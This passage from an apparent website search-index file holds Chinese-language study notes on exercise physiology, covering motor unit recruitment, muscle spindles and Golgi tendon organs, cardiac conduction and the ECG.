\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u4e00\u6b21\uff0c\u5f15\u8d77\u7684\u5355\u6536\u7f29\u4e0d\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u529b\u3002\u7136\u800c\uff0c\u5982\u679c\u6fc0\u6d3b\u9891\u7387\u589e\u52a0\u4f7f\u5355\u6536\u7f29\u4ea7\u751f\u7684\u529b\u5f00\u59cb\u53e0\u52a0\u6216\u878d\u5408\uff0c\u8fd0\u52a8\u5355\u4f4d\u4ea7\u751f\u7684\u5408\u529b\u5c31\u5927\u5f97\u591a\u3002\u8fd9\u79cd\u6539\u53d8\u529b\u91cf\u8f93\u51fa\u5927\u5c0f\u7684\u65b9\u6cd5\u5728\u5c0f\u808c\u8089\u7fa4\u4e2d\u5c24\u5176\u91cd\u8981\uff0c\u4f8b\u5982\u624b\u90e8\u808c\u7fa4\u3002\u5373\u4f7f\u5728\u8f83\u4f4e\u7684\u529b\u91cf\u8f93\u51fa\u4e0b\uff0c\u8fd9\u4e9b\u808c\u8089\u4e2d\u7684\u5927\u591a\u6570\u8fd0\u52a8\u5355\u4f4d\u4e5f\u90fd\u88ab\u6fc0\u6d3b\uff0c\u5c3d\u7ba1\u9891\u7387\u8f83\u4f4e\u3002\u6574\u4e2a\u808c\u8089\u7684\u529b\u91cf\u8f93\u51fa\u968f\u7740\u8fd0\u52a8\u5355\u4f4d\u7684\u6fc0\u6d3b\u9891\u7387\u589e\u52a0\u800c\u53d8\u5927\u3002","title":"\u901a\u8fc7\u6539\u53d8\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u7684\u9891\u7387"},{"location":"soft/NSCA/#_21","text":"\u53e6\u4e00\u79cd\u6539\u53d8\u808c\u529b\u7684\u65b9\u6cd5\u662f\u901a\u8fc7\u6539\u53d8\u6fc0\u6d3b\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf\u6765\u589e\u5927\u529b\uff0c\u8fd9\u4e00\u8fc7\u7a0b\u79f0\u4e3a\u52df\u96c6\u3002\u5728\u5927\u808c\u8089\u7fa4\uff08\u4f8b\u5982\u5927\u817f\u7684\u808c\u7fa4)\u4e2d\uff0c\u5f53\u8fd0\u52a8\u5355\u4f4d\u88ab\u6fc0\u6d3b\u65f6\u5df2\u7ecf\u5904\u4e8e\u63a5\u8fd1\u5f3a\u76f4\u7684\u9891\u7387\u3002\u56e0\u6b64\uff0c\u529b\u91cf\u8f93\u51fa\u7684\u589e\u52a0\u662f\u901a\u8fc7\u52df\u96c6\u989d\u5916\u7684\u8fd0\u52a8\u5355\u4f4d\u6570\u91cf\u5b9e\u73b0\u7684\u3002","title":"\u901a\u8fc7\u6539\u53d8\u6fc0\u6d3b\u8fd0\u52a8\u5355\u4f4d\u7684\u6570\u91cf"},{"location":"soft/NSCA/#_22","text":"\u4e0d\u540c\u7c7b\u578b\u7684\u8fd0\u52a8\u5355\u4f4d\u4f1a\u56e0\u5176\u751f\u7406\u5b66\u7279\u70b9\u800c\u5728\u4e0d\u540c\u7684\u6d3b\u52a8\u4e2d\u88ab\u52df\u96c6\uff08\u88681.2)\u3002\u4f8b\u5982\u50cf\u8fdc\u8ddd\u79bb\u8dd1\u8fd9\u6837\u7684\u9879\u76ee\uff0c\u6162\u808c\u8fd0\u52a8\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c \u56e0\u5176\u5177\u6709\u8f83\u9ad8\u7684\u6548\u7387\u3001\u8010\u529b\u548c\u6297\u75b2\u52b3\u80fd\u529b\u3002\u5982\u679c\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\uff0c\u5982\u6bd4\u8d5b\u7684\u6700\u540e\u51b2\u523a\u9636\u6bb5\uff0c \u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c\u4ee5\u52a0\u5feb\u6b65\u4f10\uff1b\u53ef\u60dc\u7684\u662f\uff0c\u8fd9\u79cd\u5f3a\u5ea6\u7684\u6d3b\u52a8\u96be\u4ee5\u957f\u65f6\u95f4\u7ef4\u6301\u3002 \u5982\u679c\u4e00\u79cd\u6d3b\u52a8\u9700\u8981\u63a5\u8fd1\u6700\u5927\u529b\u91cf\u7684\u8fd0\u52a8\u8868\u73b0\uff0c\u4f8b\u5982 \u9ad8\u7ffb \uff0c\u90a3\u4e48\u7edd\u5927\u591a\u6570\u8fd0\u52a8\u5355\u4f4d\u90fd\u4f1a\u53c2\u4e0e\u8fdb\u6765\uff0c\u540c\u65f6\u5feb\u808c\u8fd0\u52a8\u5355\u4f4d\u7684\u8d21\u732e\u4f1a\u66f4\u591a\u3002 \u672a\u7ecf\u8bad\u7ec3\u7684\u4eba\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5b8c\u5168\u6fc0\u6d3b\u6240\u6709\u53ef\u7528\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u3002\u5c3d\u7ba1\u7528\u529b\u8db3\u591f\u65f6\uff0c\u5927\u7684\u5feb\u808c\u5355\u4f4d\u4f1a\u88ab\u52df\u96c6\uff0c\u4f46\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u65e0\u6cd5\u8fbe\u5230\u8db3\u591f\u9ad8\u7684\u6fc0\u6d3b\u9891\u7387\u4ee5\u53d1\u6325\u5176\u6700\u5927\u529b\u91cf\u3002","title":"\u4e0d\u540c\u7c7b\u578b\u808c\u7ea4\u7ef4\u5728\u4e0d\u540c\u4f53\u80b2\u9879\u76ee\u4e2d\u7684\u76f8\u5bf9\u53c2\u4e0e\u7a0b\u5ea6"},{"location":"soft/NSCA/#_23","text":"\u8fdb\u884c\u8f83\u91cd\u8d1f\u8377\u7684\u8bad\u7ec3\uff0c\u4ee5\u63d0\u9ad8\u795e\u7ecf\u52df\u96c6\u3002 \u589e\u5927\u53c2\u4e0e\u76ee\u6807\u8fd0\u52a8\u6240\u9700\u808c\u8089\u7684\u6a2a\u622a\u9762\u9762\u79ef\u3002 \u8fdb\u884c\u80fd\u591f\u4ee5\u9ad8\u7206\u53d1\u529b\u52a8\u4f5c\u5b8c\u6210\u7684\u591a\u808c\u8089\u3001\u591a\u5173\u8282\u8bad\u7ec3\uff0c\u4ee5\u63d0\u9ad8\u5feb\u808c\u7ea4\u7ef4\u7684\u52df\u96c6\u3002","title":"\u8fd0\u52a8\u5458\u5982\u4f55\u63d0\u9ad8\u529b\u91cf\u4ea7\u51fa"},{"location":"soft/NSCA/#_24","text":"","title":"\u672c\u4f53\u611f\u89c9"},{"location":"soft/NSCA/#_25","text":"\u672c\u4f53\u611f\u53d7\u5668\u662f\u4f4d\u4e8e\u5173\u8282\u3001\u808c\u8089\u548c\u808c\u8171\u7684\u7279\u6b8a\u7684\u611f\u53d7\u63a5\u6536\u5668\u3002\u56e0\u4e3a\u8fd9\u4e9b\u63a5\u6536\u5668\u5bf9\u538b\u529b\u548c\u5f20\u529b\u654f\u611f\uff0c\u6240\u4ee5\u5b83\u4eec\u5c06\u808c\u8089\u52a8\u6001\u4fe1\u606f\u4f20\u9012\u7ed9\u4e2d\u67a2\u795e\u7ecf\u7cfb\u7edf\u7684\u610f\u8bc6\u548c\u6f5c\u610f\u8bc6\u90e8\u5206\u3002\u5927\u8111\u4ee5\u6b64\u83b7\u5f97\u5173\u4e8e\u8fd0\u52a8\u611f\u89c9\u7684\u4fe1\u606f\u6216\u8eab\u4f53\u5404\u90e8\u4f4d\u76f8\u5bf9\u91cd\u529b\u65b9\u5411\u7684\u4f4d\u7f6e\u7684\u6709\u610f\u8bc6\u7684\u611f\u77e5\u3002\u7136\u800c\uff0c\u5927\u591a\u6570\u8fd9\u79cd\u672c\u4f53\u611f\u53d7\u4fe1\u606f\u662f\u5728\u6f5c\u610f\u8bc6\u4e0b\u5904\u7406\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u5fc5\u5c06\u6709\u610f\u8bc6\u7684\u7cbe\u529b\u82b1\u8d39\u5728\u8bf8\u5982\u7ef4\u6301\u8eab\u4f53\u5404\u90e8\u4f4d\u7684\u59ff\u6001\u6216\u4f4d\u7f6e\u8fd9\u6837\u7684\u4efb\u52a1\u4e0a\u3002 \u672c\u4f53\u611f\u53d7\u5668\u662f\u7279\u6b8a\u7684\u611f\u89c9\u53d7\u4f53\uff0c\u4e3a\u4e2d\u67a2\u795e\u7ecf\u7cfb\u7edf\u63d0\u4f9b\u7ef4\u6301\u808c\u8089\u5f20\u529b\u548c\u6289\u6267\u884c\u590d\u6742\u534f\u8c03\u8fd0\u52a8\u6240\u9700\u7684\u4fe1\u606f\u3002","title":"\u672c\u4f53\u611f\u53d7\u5668"},{"location":"soft/NSCA/#-","text":"\u808c\u68ad\u662f\u4e00\u79cd\u672c\u4f53\u611f\u53d7\u5668\uff0c\u7531\u88ab\u5305\u88f9\u5728\u7ed3\u7f14\u7ec4\u7ec7\u9798\u4e2d\u7684\u51e0\u4e2a\u808c\u7ea4\u7ef4\u53d8\u4f53\u7ec4\u6210\uff08\u56fe1.9)\u3002\u8fd9\u4e9b\u7ea4\u7ef4\u53d8\u4f53\u79f0\u4e3a \u68ad\u5185\u808c\u7ea4\u7ef4 \uff0c\u4e0e\u6b63\u5e38\u808c\u7ea4\u7ef4\u6216\u79f0\u4e3a\u68ad\u5916\u808c\u7ea4\u7ef4\u5e73\u884c\u6392\u5217\u3002\u808c\u68ad\u63d0\u4f9b\u5173\u4e8e\u808c\u8089\u957f\u5ea6\u548c\u957f\u5ea6\u53d8\u5316\u7387\u7684\u4fe1\u606f\u3002\u5f53\u808c\u8089\u8212\u5f20\u65f6\uff0c\u808c\u68ad\u88ab\u62c9\u957f\u3002\u8fd9\u79cd\u5f62\u53d8\u6fc0\u6d3b\u68ad\u5185\u7684\u611f\u89c9\u795e\u7ecf\u5143\uff0c\u540e\u8005\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u81f3\u810a\u9ad3\uff0c\u800c\u810a\u9ad3\u7684\u7a81\u89e6\u4e0e\u8fd0\u52a8\u795e\u7ecf\u5143\u5f62\u6210\u8fde\u63a5\u3002\u8fd9\u5bfc\u81f4\u652f\u914d\u76f8\u540c\u808c\u8089\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u7684\u6fc0\u6d3b\u3002\u808c\u68ad\u56e0\u6b64\u53ef\u53cd\u6620\u808c\u8089\u4e3a\u4e86\u514b\u670d\u7279\u5b9a\u7684\u963b\u529b\u6240\u9700\u8981\u88ab\u6fc0\u6d3b\u7684\u7a0b\u5ea6\u3002 \u968f\u7740\u8d1f\u8377\u589e\u52a0\uff0c\u808c\u8089\u88ab\u62c9\u4f38\u7684\u7a0b\u5ea6\u66f4\u5927\uff0c\u808c\u68ad\u7684\u53c2\u4e0e\u5bfc\u81f4\u808c\u8089\u88ab\u66f4\u591a\u5730\u6fc0\u6d3b\u3002\u6267\u884c\u7cbe\u786e\u8fd0\u52a8\u7684\u808c\u8089\uff0c\u6bcf\u5355\u4f4d\u8d28\u91cf\u542b\u6709\u5f88\u591a\u7684\u808c\u68ad\uff0c\u4ee5\u5e2e\u52a9\u786e\u4fdd\u7cbe\u786e\u63a7\u5236\u6536\u7f29\u6d3b\u52a8\u3002\u6709\u5173\u808c\u68ad\u6d3b\u52a8\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u662f\u819d\u8df3\u53cd\u5c04\u3002\u6572\u51fb\u9acc\u9aa8\u4e0b\u65b9\u4f38\u819d\u808c\u7fa4\u7684\u808c\u5065\u4f1a\u62c9\u957f\u68ad\u5185\u808c\u7ea4\u7ef4\uff0c\u5e76\u5f15\u8d77\u540c\u808c\u8089\u4e2d\u7684\u68ad\u5916\u808c\u7ea4\u7ef4\u7684\u6fc0\u6d3b\u3002\u5f53\u8fd9\u4e9b\u68ad\u5916\u808c\u7ea4\u7ef4\u4e3b\u52a8\u7f29\u77ed\u65f6\uff0c\u51fa\u73b0\u819d\u8df3\u53cd\u5c04\u3002\u8fd9\u53cd\u8fc7\u6765\u53c8\u4f1a\u4f7f\u68ad\u5185\u808c\u7ea4\u7ef4\u7f29\u77ed\u8fdb\u800c\u505c\u6b62\u653e\u7535\u53cd\u5e94\u3002","title":"\u808c\u68ad-\u6fc0\u6d3b"},{"location":"soft/NSCA/#-_1","text":"\u9ad8\u5c14\u57fa\u8171\u5668(GTO)\uff0c\u53c8\u79f0\u8171\u68ad\uff0c\u662f\u4f4d\u4e8e\u808c\u8171\u7684\u672c\u4f53\u611f\u53d7\u5668\uff0c\u9760\u8fd1\u808c\u8089\u4e0e\u808c\u8171\u8fde\u63a5\u5904\uff0c\u548c\u68ad\u5916\u808c\u7ea4\u7ef4\u4e32\u8054\uff08\u56fe1.10\uff09\u3002\u5f53\u4e0e\u6d3b\u52a8\u808c\u8089\u76f8\u8fde\u63a5\u7684\u808c\u8171\u88ab\u62c9\u4f38\u65f6\uff0cGTO\u88ab\u6fc0\u6d3b\u3002\u968f\u7740\u808c\u8089\u4e2d\u7684\u5f20\u529b\u589e\u52a0\uff0cGTO\u7684\u653e\u7535\u589e\u52a0\u3002\u9ad8\u5c14\u57fa\u8171\u5668\u7684\u611f\u89c9\u795e\u7ecf\u5143\u4e0e\u810a\u9ad3\u4e2d\u7684\u6291\u5236\u6027\u4e2d\u95f4\u795e\u7ecf\u5143\u5f62\u6210\u7a81\u89e6\u8fde\u63a5\uff0c\u4ece\u800c\u901a\u8fc7\u4e2d\u95f4\u795e\u7ecf\u5143\u8fde\u63a5\u5e76\u6291\u5236\u76f8\u540c\u808c\u8089\u7684\u8fd0\u52a8\u795e\u7ecf\u5143\u3002\u7ed3\u679c\u662f\u808c\u8089\u548c\u808c\u8171\u5185\u7684\u5f20\u529b\u51cf\u5c0f\u3002 \u56e0\u6b64\uff0c\u808c\u68ad\u4fc3\u8fdb\u808c\u8089\u7684\u6fc0\u6d3b\uff0c\u6765\u81eaGTO\u7684\u795e\u7ecf\u8f93\u5165\u5219\u6291\u5236\u808c\u8089\u6fc0\u6d3b\u3002GTO\u7684\u6291\u5236\u8fc7\u7a0b\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u9632\u6b62\u808c\u8089\u4ea7\u751f\u8fc7\u591a\u5f20\u529b\u7684\u4fdd\u62a4\u673a\u5236\u3002\u56e0\u6b64\uff0cGTO\u7684\u6548\u679c\u5728\u53d7\u529b\u5c0f\u65f6\u662f\u6700\u4f4e\u7684\uff1b\u4f46\u662f\u5f53\u808c\u8089\u627f\u53d7\u6781\u91cd\u7684\u8d1f\u8377\u65f6\uff0c\u7531GTO\u4f20\u5bfc\u7684\u53cd\u5c04\u6027\u6291\u5236\u4f1a\u5bfc\u81f4\u808c\u8089\u653e\u677e\u3002\u5927\u8111\u8fd0\u52a8\u76ae\u5c42\u8986\u76d6\u8be5\u6291\u5236\u7684\u80fd\u529b\u53ef\u80fd\u662f\u5bf9\u9ad8\u8d1f\u8377\u963b\u529b\u8bad\u7ec3\u4ea7\u751f\u7684\u57fa\u672c\u9002\u5e94\u4e4b\u4e00\u3002","title":"\u9ad8\u5c14\u57fa\u8171\u5668-\u6291\u5236"},{"location":"soft/NSCA/#_26","text":"\u5fc3\u810f\u662f\u4e00\u4e2a\u808c\u8089\u7c7b\u5668\u5b98\uff0c\u5c71\u4e24\u4e2a\u76f8\u4e92\u8fde\u63a5\u4f46\u5404\u81ea\u72ec\u7acb\u7684\u8154\u5ba4\u6cf5\u7ec4\u6210\uff1b\u5fc3\u810f\u7684\u53f3\u4fa7\u5c06\u8840\u6db2\u6cf5\u5411\u80ba\u90e8\uff08\u80ba\u5faa\u73af\uff09\uff0c\u5de6\u607b\u5c06\u8840\u6db2\u6cf5\u5f80\u5168\u8eab\u5176\u4ed6\u90e8\u4f4d\uff08\u4f53\u5faa\u73af\uff09\u3002\u6bcf\u4e2a\u6cf5\u5404\u6709\u4e24\u4e2a\u8154\u5ba4\uff1a\u5fc3\u623f\u548c\u5fc3\u5ba4\uff08\u56fe1.11)\u3002\u53f3\u5fc3\u623f\u548c\u5de6\u5fc3\u623f\u5206\u522b\u5c06\u8840\u6db2\u8f93\u9001\u5230\u53f3\u5fc3\u5ba4\u548c\u5de6\u5fc3\u5ba4\u3002\u53f3\u5fc3\u5ba4\u548c\u5de6\u5fc3\u5ba4\u5206\u522b\u4e3a\u8840\u6db2\u7684\u80ba\u5faa\u73af\u548c\u4f53\u5faa\u73af\u63d0\u4f9b\u52a8\u529b\u3002","title":"\u5fc3\u810f"},{"location":"soft/NSCA/#_27","text":"\u4e09\u5c16\u74e3\u548c\u50e7\u5e3d\u74e3\uff08\u4e8c\u5c16\u74e3\uff09\uff08\u7edf\u79f0\u4e3a\u623f\u5ba4\u74e3\uff09\u5728\u5fc3\u5ba4\u6536\u7f29\uff08\u5fc3\u7f29\u671f\uff09\u671f\u95f4\u9632\u6b62\u8840\u6db2\u4ece\u5fc3\u5ba4\u6d41\u56de\u5fc3\u623f\u3002\u4e3b\u52a8\u8109\u74e3\u548c\u80ba\u52a8\u8109\u74e3\uff08\u7edf\u79f0\u4e3a\u534a\u6708\u74e3\uff09\u5728\u5fc3\u5ba4\u8212\u5f20\uff08\u5fc3\u8212\u671f\uff09\u671f\u95f4\u9632\u6b62\u8840\u6db2\u4ece\u4e3b\u52a8\u8109\u548c\u80ba\u52a8\u8109\u56de\u6d41\u5230\u5fc3\u5ba4\u4e2d\u3002\u6bcf\u4e2a\u74e3\u819c\u88ab\u52a8\u6253\u5f00\u548c\u5173\u95ed\u3002\u5f53\u5411\u540e\u7684\u538b\u529b\u5c06\u8840\u6db2\u53cd\u5411\u63a8\u56de\u65f6\uff0c\u74e3\u819c\u5173\u95ed\u4f7f\u8840\u6db2\u4e0d\u80fd\u56de\u6d41\uff1b\u5f53\u538b\u529b\u5411\u524d\u4f7f\u8840\u6db2\u524d\u884c\u65f6\uff0c\u74e3\u819c\u5f00\u542f\u4f7f\u8840\u6db2\u901a\u8fc7\u3002","title":"\u74e3\u819c"},{"location":"soft/NSCA/#_28","text":"\u4e00\u4e2a\u7279\u6b8a\u7684\u7535\u4f20\u5bfc\u7cfb\u7edf\uff08\u56fe1.12)\u63a7\u5236\u5fc3\u810f\u7684\u673a\u68b0\u6027\u6536\u7f29\u3002\u8be5\u4f20\u5bfc\u7cfb\u7edf\u7684\u7ec4\u6210\u5305\u62ec\uff1a \u7aa6\u623f\u7ed3----\u5fc3\u810f\u7684\u5185\u5728\u8d77\u640f\u5668\uff0c\u8fd9\u662f\u6709\u8282\u594f\u7684\u7535\u8109\u51b2\u7684\u8d77\u59cb\u70b9\uff1b \u7ed3\u95f4\u675f----\u5c06\u7535\u8109\u51b2\u4ece\u7aa6\u623f\u7ed3\u4f20\u5bfc\u5230\u623f\u5ba4\u7ed3\uff1b \u623f\u5ba4\u7ed3----\u4f7f\u7535\u8109\u51b2\u5728\u8fdb\u5165\u5fc3\u5ba4\u4e4b\u524d\u7a0d\u5fae\u5ef6\u8fdf\uff1b \u623f\u5ba4\u675f----\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u5230\u5fc3\u5ba4\uff1b \u5de6\u675f\u652f\u548c\u53f3\u675f\u652f----\u8fdb\u4e00\u6b65\u5206\u6210\u6d66\u80af\u91ce\u7ea4\u7ef4\u5e76\u5c06\u7535\u8109\u51b2\u4f20\u5bfc\u5230\u5fc3\u5ba4\u7684\u6240\u6709\u90e8\u5206\u3002 \u7aa6\u623f\u7ed3\u662f\u4f4d\u4e8e\u53f3\u5fc3\u623f\u4e0a\u5916\u4fa7\u58c1\u4e2d\u7684\u5c0f\u8303\u5236\u7279\u5316\u808c\u8089\u7ec4\u7ec7\u3002\u7aa6\u623f\u7ed3\u7684\u7ea4\u7ef4\u4e0e\u5fc3\u623f\u7684\u808c\u7ea4\u7ef4\u76f8\u8fde\uff0c\u8fd9\u5bfc\u81f4\u5728\u7aa6\u623f\u7ed3\u4e2d\u8d77\u59cb\u7684\u6bcf\u6b21\u7535\u8109\u51b2\u901a\u5e38\u4f1a\u7acb\u5373\u6269\u6563\u5230\u5fc3\u623f\u4e2d\u3002\u4f20\u5bfc\u7cfb\u7edf\u7684\u7ed3\u6784\u4f7f\u5176\u4e0d\u4f1a\u5c06\u7535\u8109\u51b2\u8fc5\u901f\u4f20\u5bfc\u81f3\u5fc3\u5ba4\uff0c\u4ece\u800c\u4f7f\u5fc3\u623f\u6709\u65f6\u95f4\u5728\u5fc3\u5ba4\u5f00\u59cb\u6536\u7f29\u4e4b\u524d\u628a\u8840\u6db2\u6cf5\u5165\u5fc3\u5ba4\u3002\u5ef6\u8fdf\u6bcf\u6b21\u7535\u8109\u51b2\u8fdb\u5165\u5fc3\u5ba4\u7684\uff0c\u4e3b\u8981\u662f\u623f\u5ba4\u7ed3\u53ca\u5176\u76f8\u5173\u8054\u7684\u4f20\u5bfc\u7ea4\u7ef4\u3002\u623f\u5ba4\u7ed3\u4f4d\u4e8e\u53f3\u5fc3\u623f\u7684\u540e\u4fa7\u5fc3\u58c1\u5904\u3002","title":"\u5fc3\u4f20\u5bfc\u7cfb\u7edf"},{"location":"soft/NSCA/#_29","text":"\u5de6\u675f\u652f\u548c\u53f3\u675f\u652f\u4ece\u623f\u5ba4\u675f\u5ef6\u4f38\u5230\u5fc3\u5ba4\u4e2d\u3002\u9664\u4e86\u5b83\u4eec\u4f38\u5165\u623f\u5ba4\u95f4\u9694\u7684\u8d77\u59cb\u90e8\u5206\uff0c\u8fd9\u4e9b\u4f20\u5bfc\u7ea4\u7ef4\u5177\u6709\u4e0e\u623f\u5ba4\u7ed3\u7ea4\u7ef4\u5b8c\u5168\u76f8\u53cd\u7684\u529f\u80fd\u7279\u6027\u3002\u5b83\u4eec\u7684\u4f53\u79ef\u66f4\u5927\uff0c\u4f20\u5bfc\u901f\u5ea6\u4e5f\u6bd4\u623f\u5ba4\u7ed3\u7ea4\u7ef4\u66f4\u5feb\u3002\u7531\u4e8e\u8fd9\u4e9b\u7ea4\u7ef4\u8ba9\u4f4d\u4e8e\u5b8c\u5168\u6e17\u900f\u5fc3\u5ba4\u7684\u6d66\u80af\u91ce\u7ea4\u7ef4\uff0c\u56e0\u6b64\uff0c\u7535\u8109\u51b2\u5728\u6574\u4e2a\u5fc3\u5ba4\u7cfb\u7edf\u4e2d\u5feb\u901f\u4f20\u5bfc\uff0c\u5e76\u4e14\u4f7f\u4e24\u4e2a\u5fc3\u5ba4\u5728\u51e0\u4e4e\u76f8\u540c\u7684\u65f6\u95f4\u6536\u7f29","title":"\u5de6\u675f\u652f\u548c\u53f3\u675f\u652f"},{"location":"soft/NSCA/#_30","text":"\u7aa6\u623f\u7ed3\u901a\u5e38\u63a7\u5236\u5fc3\u810f\u8282\u5f8b\u6027\uff0c\u56e0\u4e3a\u5176\u653e\u7535\u9891\u7387\uff08\u6bcf\u5206\u949f60~80\u6b21)\u6bd4\u623f\u5ba4\u7ed3\uff08\u6bcf\u5206\u949f40~60\u6b21)\u6216\u5fc3\u5ba4\u7ea4\u7ef4\uff08\u6bcf\u5206\u949f15~40\u6b21\uff09 \u66f4\u9ad8\u3002\u6bcf\u6b21\u7aa6\u623f\u7ed3\u653e\u7535\uff0c\u5176\u8109\u51b2\u88ab\u4f20\u5bfc\u5230\u623f\u5ba4\u7ed3\u548c\u5fc3\u5ba4\u7ea4\u7ef4\uff0c\u4f7f\u7ec6\u80de\u819c\u5174\u594b\u5e76\u4ea7\u751f\u653e\u7535\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e9b\u6f5c\u5728\u7684\u81ea\u5174\u594b\u7ec4\u7ec7\u5728\u81ea\u52a8\u8282\u5f8b\u4ea7\u751f\u524d\u5df2\u7ecf\u5174\u594b\u3002 \u5fc3\u808c \u7684 \u56fa\u6709\u8282\u5f8b\u6027 \u548c \u4f20\u5bfc\u6027 \u53d7\u5230\u5ef6\u9ad3\u7684\u5fc3\u8840\u7ba1\u4e2d\u67a2\u7684\u5f71\u54cd\u3002\u5fc3\u8840\u7ba1\u4e2d\u67a2\u901a\u8fc7 \u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf \u548c \u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf \u5c06\u4fe1\u53f7\u4f20\u9012\u5230\u5fc3\u810f\uff0c\u800c\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u4e0e\u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u662f \u81ea\u4e3b\u795e\u7ecf\u7cfb\u7edf \u7684\u7ec4\u6210\u90e8\u5206\u3002\u5fc3\u623f\u6709\u5927\u91cf\u7684 \u4ea4\u611f\u795e\u7ecf\u5143 \u548c \u526f\u4ea4\u611f\u795e\u7ecf\u5143 \uff0c\u800c\u5fc3\u5ba4\u51e0\u4e4e\u53ea\u4e0e\u4ea4\u611f\u795e\u7ecf\u7ea4\u7ef4\u8fde\u63a5\u3002\u4ea4\u611f\u795e\u7ecf\u7684\u523a\u6fc0\u52a0\u901f\u7aa6\u623f\u7ed3\u7684\u53bb\u6781\u5316(\u53d8\u65f6\u6548\u5e94)\uff0c\u8fd9\u5bfc\u81f4\u5fc3\u810f\u640f\u52a8\u66f4\u5feb\u3002\u526f\u4ea4\u611f\u795e\u7ecf\u7cfb\u7edf\u7684\u523a\u6fc0\u4f1a\u51cf\u6162\u7aa6\u623f\u7ed3\u653e\u7535\u9891\u7387\uff0c\u4f7f\u5fc3\u7387\u964d\u4f4e\u3002\u9759\u606f\u5fc3\u7387\u901a\u5e38\u4e3a\u6bcf\u5206\u949f60~100\u6b21\u5c11\u4e8e60\u6b21\u88ab\u79f0\u4e3a \u5fc3\u52a8\u8fc7\u7f13 \uff0c\u800c\u8d85\u8fc7100\u6b21\u88ab\u79f0\u4e3a \u5fc3\u52a8\u8fc7\u901f \u3002","title":"\u7aa6\u623f\u7ed3"},{"location":"soft/NSCA/#_31","text":"\u5fc3\u810f\u7684\u7535\u6d3b\u52a8\u53ef\u4ece\u8eab\u4f53\u8868\u9762\u91c7\u96c6\u5230\uff0c\u8be5\u6d3b\u52a8\u7684\u56fe\u5f62\u88ab\u79f0\u4e3a \u5fc3\u7535\u56fe(ECG) \u3002\u56fe1.13 \u6240\u793a\u7684\u6b63\u5e38\u5fc3\u7535\u56fe\u7531P\u6ce2\u3001QRS\u6ce2\u7fa4(QRS\u6ce2\u7fa4\u901a\u5e38\u4e3a3\u4e2a\u6ce2\uff0c\u5373Q\u6ce2\u3001R\u6ce2\u548cS\u6ce2)\u548cT\u6ce2\u7ec4\u6210\u3002P\u6ce2\u548cQRS\u6ce2\u8bb0\u5f55\u7684\u662f\u7535\u4f4d\u53bb\u6781\u5316\uff0c\u5373\u5bfc\u81f4\u673a\u68b0\u6536\u7f29\u7684\u7535\u523a\u6fc0\u3002\u53bb\u6781\u5316\u662f\u819c\u7535\u4f4d\u7684\u9006\u8f6c\uff0c\u6b64\u65f6\u819c\u5185\u901a\u5e38\u4e3a\u8d1f\u7684\u7535\u4f4d\u53d8\u4e3a\u7a0d\u6b63\uff0c\u819c\u5916\u7535\u4f4d\u53d8\u4e3a\u7a0d\u8d1f\u3002P\u6ce2\u662f\u5fc3\u808c\u7ec6\u80de\u7535\u4f4d\u6539\u53d8\u7684\u7ed3\u679c\u2014\u2014\u8fd9\u4f7f\u5fc3\u623f\u53bb\u6781\u5316\u5e76\u9020\u6210\u5fc3\u623f\u6536\u7f29\u3002QRS\u6ce2\u7fa4\u662f\u7531\u5f15\u8d77\u5fc3\u5ba4\u53bb\u6781\u5316\u7684\u7535\u4f4d\u6539\u53d8\u4ea7\u751f\u7684\u7ed3\u679c\u2014\u2014\u8fd9\u9020\u6210\u5fc3\u5ba4\u6536\u7f29\u3002\u76f8\u53cd\uff0cT\u6ce2\u662f\u7531\u5fc3\u5ba4\u4ece\u53bb\u6781\u5316\u72b6\u6001\u6062\u590d\u65f6\u4ea7\u751f\u7684\u7535\u4f4d\u6240\u5f15\u8d77\u7684\uff1b\u8fd9\u79cd\u79f0\u4e3a\u590d\u6781\u5316\u7684\u8fc7\u7a0b\u53d1\u751f\u5728\u53bb\u6781\u5316\u540e\u4e0d\u4e45\u7684\u5fc3\u808c\u4e2d\u3002\u867d\u7136\u5fc3\u623f\u4e5f\u53d1\u751f\u590d\u6781\u5316\uff0c\u4f46\u5176\u6ce2\u5f62\u901a\u5e38\u53d1\u751f\u5728\u5fc3\u5ba4\u53bb\u6781\u5316\u671f\u95f4\uff0c\u56e0\u6b64\u88abQRS\u6ce2\u7fa4\u63a9\u76d6","title":"\u5fc3\u7535\u56fe"},{"location":"soft/NSCA/#_32","text":"\u4e2d\u592e\u548c\u5916\u5468\u8840\u6db2\u5faa\u73af\u6784\u6210\u4e00\u4e2a\u95ed\u8def\u5faa\u73af\u7cfb\u7edf\uff0c\u8fd9\u4e2a\u7cfb\u7edf\u5305\u62ec\u4e24\u90e8\u5206\uff1a \u5c06\u8840\u6db2\u4ece\u5fc3\u810f\u6cf5\u51fa\u7684\u52a8\u8109\u7cfb\u7edf(\u56fe1.14) \u4f7f\u8840\u6db2\u8fd4\u56de\u5fc3\u810f\u7684\u9759\u8109\u7cfb\u7edf(\u56fe1.14) \u6bcf\u4e2a\u7cfb\u7edf\u7684\u8840\u7ba1\u662f\u6709\u533a\u522b\u7684\u3002","title":"\u8840\u7ba1"},{"location":"soft/NSCA/#_33","text":"\u52a8\u8109\u7684\u529f\u80fd \uff1a\u52a8\u8109\u8d1f\u8d23\u5c06\u8840\u6db2\u5feb\u901f\u5730\u4ece\u5fc3\u810f\u8f93\u9001\u5230\u5168\u8eab\u5404\u4e2a\u90e8\u5206\u3002 